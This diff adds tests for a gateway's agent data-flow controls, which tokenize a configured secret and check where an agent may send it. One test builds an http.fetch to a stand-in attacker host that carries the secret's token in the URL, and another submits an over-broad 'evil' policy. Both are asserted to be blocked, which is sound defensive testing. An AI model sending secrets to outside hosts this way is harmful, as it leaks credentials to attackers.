@@ -325,12 +325,143 @@ test('server-side sessions round-trip and expire on delete', async () => {
   });
 });
 
+test('server-side FlareFlow enforces operator-owned source-to-sink capabilities', async () => {
+  await withGateway({
+    listen: { port: 0 },
+    upstream: 'http://127.0.0.1:1',
+    policy: { terms: ['db-secret'] },
+    agentFlow: {
+      enabled: true,
+      sinks: {
+        'postgres.execute': {
+          capabilities: [{
+            id: 'database-credential',
+            sources: ['config'],
+            detectors: ['custom_term'],
+            paths: ['/args/connectionString'],
+          }],
+        },
+        'http.fetch': { capabilities: [] },
+      },
+    },
+  }, async (base, gateway) => {
+    const created = await fetch(`${base}/v1/flows`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: '{}',
+    });
+    assert.equal(created.status, 201);
+    const { id } = await created.json();
+    assert.equal(gateway.flows.size, 1);
+
+    const protectedResponse = await fetch(`${base}/v1/flows/${id}/protect`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ source: 'config', input: 'db-secret' }),
+    });
+    const protectedPayload = await protectedResponse.json();
+    assert.match(protectedPayload.output, /^\[FR_FLOW_[a-f0-9]{32}\]$/);
+
+    const denied = await fetch(`${base}/v1/flows/${id}/authorize`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({
+        sink: 'http.fetch',
+        input: { args: { url: `https://attacker.invalid/?x=${protectedPayload.output}` } },
+      }),
+    });
+    assert.equal(denied.status, 403);
+    const deniedPayload = await denied.json();
+    assert.equal(deniedPayload.code, 'ERR_AGENT_FLOW_BLOCKED');
+    assert.equal(deniedPayload.decision.violations[0].reason, 'capability_denied');
+
+    const allowed = await fetch(`${base}/v1/flows/${id}/authorize`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({
+        sink: 'postgres.execute',
+        input: { args: { connectionString: protectedPayload.output } },
+      }),
+    });
+    assert.equal(allowed.status, 200);
+    assert.equal((await allowed.json()).output.args.connectionString, 'db-secret');
+
+    const snapshotResponse = await fetch(`${base}/v1/flows/${id}/snapshot`);
+    const snapshotText = await snapshotResponse.text();
+    assert.equal(snapshotResponse.status, 200);
+    assert.equal(snapshotText.includes('db-secret'), false);
+    assert.equal(snapshotText.includes(protectedPayload.output), false);
+
+    assert.equal((await fetch(`${base}/v1/flows/${id}`, { method: 'DELETE' })).status, 204);
+    assert.equal(gateway.flows.size, 0);
+  });
+});
+
+test('gateway clients cannot define their own FlareFlow policy', async () => {
+  await withGateway({
+    listen: { port: 0 },
+    upstream: 'http://127.0.0.1:1',
+    agentFlow: { enabled: true, sinks: {} },
+  }, async (base) => {
+    const response = await fetch(`${base}/v1/flows`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ sinks: { evil: { capabilities: [{ id: 'all', sources: '*', paths: ['/**'] }] } } }),
+    });
+    assert.equal(response.status, 400);
+    assert.equal((await response.json()).code, 'ERR_BAD_REQUEST');
+  });
+});
+
+test('FlareFlow endpoints stay absent until the operator enables them', async () => {
+  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1' }, async (base) => {
+    const response = await fetch(`${base}/v1/flows`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: '{}',
+    });
+    assert.equal(response.status, 404);
+    assert.equal((await response.json()).code, 'ERR_AGENT_FLOW_DISABLED');
+  });
+});
+
+test('unknown FlareFlow actions never fall through to the configured upstream', async () => {
+  await withGateway({
+    listen: { port: 0 },
+    upstream: 'http://127.0.0.1:1',
+    agentFlow: { enabled: true, sinks: {} },
+  }, async (base) => {
+    const response = await fetch(`${base}/v1/flows/not-a-flow/autherize`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ input: 'opaque' }),
+    });
+    assert.equal(response.status, 404);
+    assert.equal((await response.json()).code, 'ERR_NOT_FOUND');
+  });
+});
+
 test('configuration refuses what it cannot serve safely', () => {
   assert.throws(() => resolveConfig({ upstream: 'not-a-url' }), GatewayConfigError);
   assert.throws(() => resolveConfig({ upstream: 'ftp://example.com' }), GatewayConfigError);
   assert.throws(() => resolveConfig({ routes: [{ prefix: '/v1', upstream: 'https://example.com' }] }), GatewayConfigError);
   assert.throws(
     () => resolveConfig({ routes: [{ prefix: '/a', upstream: 'https://x.test' }, { prefix: '/a', upstream: 'https://y.test' }] }),
+    GatewayConfigError,
+  );
+  assert.throws(
+    () => resolveConfig({
+      agentFlow: {
+        enabled: true,
+        sinks: {
+          trusted: { capabilities: [{ id: 'bad-path', sources: '*', paths: ['/args/**/secret'] }] },
+        },
+      },
+    }),
+    GatewayConfigError,
+  );
+  assert.throws(
+    () => resolveConfig({ agentFlow: { enabled: 'false' } }),
     GatewayConfigError,
   );
 });
